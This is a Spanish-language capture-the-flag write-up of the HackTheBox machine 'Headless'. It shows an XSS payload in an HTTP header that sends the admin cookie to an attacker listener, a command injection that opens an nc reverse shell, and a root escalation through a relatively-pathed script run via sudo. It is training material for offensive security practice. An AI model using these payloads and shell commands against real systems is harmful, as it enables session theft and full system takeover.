---
icon: linux
tags:
  - xss
  - session-hijacking
  - os-command-injection
  - relative-path-script-hijacking
---

# Headless

## Resumen

### Detalles

| Campo                 | Detalle      |
| --------------------- | ------------ |
| **Nombre**            | Headless     |
| **Sistema Operativo** | Linux        |
| **Plataforma**        | HackTheBox   |
| **Fecha**             | 30/10/2026   |
| **IP Objetivo**       | 10.129.92.66 |

### Executive Summary

Se identifica un nivel de riesgo **Crítico** debido a la presencia de múltiples vulnerabilidades encadenables que permitieron el compromiso total del servidor web y la posterior toma de control del sistema operativo con privilegios máximos

### Técnicas

* XSS Header Injection
* Session Hijacking vía XSS
* OS Command Injection
* Abusing sudoers privilege (Relative Path Script Hijacking)

## Information Gathering

### Port Scanning

#### TCP

```bash
> nmap -Pn -n -vv -p- 10.129.92.66 -oG allPorts
> nmap -Pn -n -vv -sCV -p22,5000 10.129.92.66 -oG allServices
```

| Puerto   | Servicio | Versión                                       |
| -------- | -------- | --------------------------------------------- |
| 22/tcp   | ssh      | OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) |
| 5000/tcp | http     | Werkzeug httpd 2.2.2 (Python 3.11.2)          |

### Enumeration

#### Web

```bash
> ffuf -u "http://10.129.92.66:5000/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
```

* Directorios enumerados:
  * `/support` (Code 200)
  * `/dashboard` (Code 401)

El directorio `/dashboard` devuelve acceso no autorizado (`HTTP CODE: 401`), al hacer la petición eliminando la cookie `is_admin` que se estable automáticamente navegando naturalmente, la página devuelve Internal Server Error (`HTTP CODE: 500`).

En el directorio `/support`, hay un formulario de contacto. Al introducir un payload XSS en el parametro `message` es detectado por el sistema.

<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

Cuando es detectado, se muestra una página con toda la información de la petición.\
Los headers, no tienen detección de payloads XSS y además se representan naturalmente en la respuesta.

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

## Explotación

### Foothold

* **Vulnerabilidad:** XSS Header Injection (Session Hijacking) + OS Command Injection (RCE)
* **Exploit:** Stored XSS via HTTP Header Injection -> OS Command Injection
* **Procedimiento:**

1. **Se procede a poner un puerto en escucha para recibir la petición con la cookie en la URL**

```bash
> python3 -m http.server 22199
```

2. **Se injecta el siguiente payload en cualquier header**.

```html
<script>
(new Image()).src="http://10.10.15.78:22199/?"+encodeURIComponent(document.cookie)</script>
```



<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

Se recibe la cookie. Al decodificar el primer segmento de el valor de la cookie separado por '`.`'. Anteriormente el valor era `"user"`, en cambio, con la cookie recibida, el valor es `"admin"`.

<figure><img src="../../../.gitbook/assets/image (96).png" alt="" width="563"><figcaption></figcaption></figure>

Con esta cookie, la página `/dashboard` si que es accesible.

3.  **Inyección de comandos (RCE) en el parametro `date`, en la petición que se emite al generar un reporte. Se despliega Reverse Shell.**\
    Se realizó una prueba con `;cat /etc/passwd` y se mostró el output del comando en la respuesta con éxito.<br>

    <figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

```bash
> netcat -lvnp 4430
```

Payload a injectar:

```bash
> nc -c /bin/bash 10.10.15.78 4430
```

* **Evidencia:** (`user.txt`)\
  ![](<../../../.gitbook/assets/image (94).png>)

### Privesc

* **Vulnerabilidad:** Abuso de Permisos SUDO mediante Secuestro de Script (Relative Path Script Hijacking)
* **Exploit:** Inyección de Script Local vía Ejecución de Ruta Relativa en `syscheck`
* **Procedimiento:**

1. **Se consultan los permisos del usuario `dvir`**

```bash
sudo -l
```

\
El usuario `dvir` tiene la capacidad de ejecutar el binario `syscheck`ubicado en `/usr/bin` como `root` sin necesidad de introducir contraseña.

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

2. **Inspección de `/usr/bin/syscheck`**

```bash
> strings /usr/bin/syscheck
```

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  exit 1
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"
load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
exit 0
```

El binario `syscheck` ejecuta `initdb.sh` sin especificar la ruta completa, por lo tanto si ese archivo despliega una reverse shell se recibirá como `root`.

3. **Creación de `initdb.sh` y ejecución de `syscheck`**\
   El script `initdb.sh` debe contener una reverse shell a un puerto en escucha localmente.

```bash
# Máquina de atacante
> netcat -lvnp 4435
```

```bash
# initdb.sh
nc -c /bin/bash 10.10.15.78 4435
```

Para que todo funcione correctamente, se ejecuta `syscheck` en la misma ruta que el script `initdb.sh`.

```bash
> sudo /bin/syscheck
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure></div>

> Se recibe la shell como usuario `root`.
